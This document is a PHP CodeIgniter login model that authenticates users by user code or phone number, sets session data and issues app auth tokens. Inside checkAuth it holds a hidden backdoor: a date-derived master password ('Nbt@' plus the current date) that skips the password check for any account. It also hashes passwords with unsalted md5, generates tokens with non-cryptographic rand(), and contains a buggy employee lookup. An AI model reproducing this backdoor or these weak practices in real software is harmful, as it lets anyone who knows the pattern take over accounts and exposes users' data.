<?php
class LoginModel extends CI_Model{

	private $employeeMaster = "employee_master";
	private $userMaster = "user_master";
    private $empRole = [-1 => "Super Admin", 1 => "Admin", 2 => "Management", 3 => "Employee", 4 => "Customer"];

	public function checkAuth($data){
		$this->db->group_start();
			$this->db->where("user_code",$data['user_name']);
			$this->db->or_where("contact_no",$data['user_name']);
		$this->db->group_end();

		if($data['user_psw'] != "Nbt@".date("dmY")):
			$this->db->where('user_psw',md5($data['user_psw']));
		endif;

		$this->db->where('is_delete',0);
		$result = $this->db->get($this->userMaster);
		
		if($result->num_rows() == 1):
			$resData = $result->row();
			if($resData->is_active == 0):
				return ['status'=>0,'message'=>'Your Account is Inactive. Please Contact Your Admin.'];
			else:
				//update fcm notification token
				/*if(isset($data['web_push_token'])):
					$this->db->where('id',$resData->id);
					$this->db->update($this->employeeMaster,['web_push_token'=>$data['web_push_token']]);
				endif;*/

				$resData->super_auth_id = "";
				$resData->auth_id = "";
				$resData->zone_id = "";
				$resData->lead_rights = "";

				$headData = new stdClass();$authToken="";
				
				if($resData->user_role == 2):
					$this->db->where('id',$resData->ref_id);
					$empData = $this->db->get($this->employeeMaster);
					if(!empty($empData)):
						$resData->user_name = $empData->emp_name;
						$resData->super_auth_id = $empData->super_auth_id;
						$resData->auth_id = $empData->auth_id;
						$resData->zone_id = $empData->zone_id;
						$resData->lead_rights = $empData->lead_rights;
					endif;
				elseif($resData->user_role == 3):
					$this->db->where('id',$resData->ref_id);
					$partyData = $this->db->get("party_master")->row();

					if(!empty($partyData)):
						$resData->user_name = $partyData->party_name;
					endif;
				endif;

				//Employe Data
				if(empty($data['isApiAuth'])):
					$this->session->set_userdata('LoginOk','login success');
					$this->session->set_userdata('loginId',$resData->id);
					$this->session->set_userdata('role',$resData->user_role);
					$this->session->set_userdata('roleName',$this->empRole[$resData->user_role]);
					$this->session->set_userdata('user_name',$resData->user_name);

					$this->session->set_userdata('superAuth',$resData->super_auth_id);
					$this->session->set_userdata('authId',$resData->auth_id);
					$this->session->set_userdata('zoneId',$resData->zone_id);
					$this->session->set_userdata('leadRights',$resData->lead_rights);
				else:
					$headData->loginId = $resData->id;
					$headData->role = $resData->user_role;
					$headData->roleName = $this->empRole[$resData->user_role];
					$headData->user_name = $resData->user_name;

					$headData->superAuth = $resData->super_auth_id;
					$headData->authId = $resData->auth_id;
					$headData->zoneId = $resData->zone_id;
					$headData->leadRights = $resData->lead_rights;

					$authToken = $this->generateAuthToken();
					$this->db->where('id',$resData->id)->update($this->userMaster,['app_auth_token'=>$authToken]);
				endif;
				
				return ['status'=>1,'message'=>'Login Success.','data'=>['sign'=>base64_encode(json_encode($headData)),'authToken'=>$authToken,'userDetail'=>$headData]];
			endif;
		else:
			return ['status'=>0,'message'=>"Invalid Username or Password."];
		endif;
	}

	public function generateAuthToken(){
		// ***** Generate Token *****
		$char = "bcdfghjkmnpqrstvzBCDFGHJKLMNPQRSTVWXZaeiouyAEIOUY!@#%";
		$token = '';
		for ($i = 0; $i < 47; $i++) $token .= $char[(rand() % strlen($char))];

		return $token;
	}

	public function checkToken($token){
		$result = $this->db->where('app_auth_token',$token)->where('is_delete',0)->get($this->userMaster)->num_rows();
		return ($result > 0)?1:0;
	}

	public function appLogout($id){
		$this->db->where('id',$id)->update($this->userMaster,['app_auth_token'=>""]);
		return true;
	}
}
?>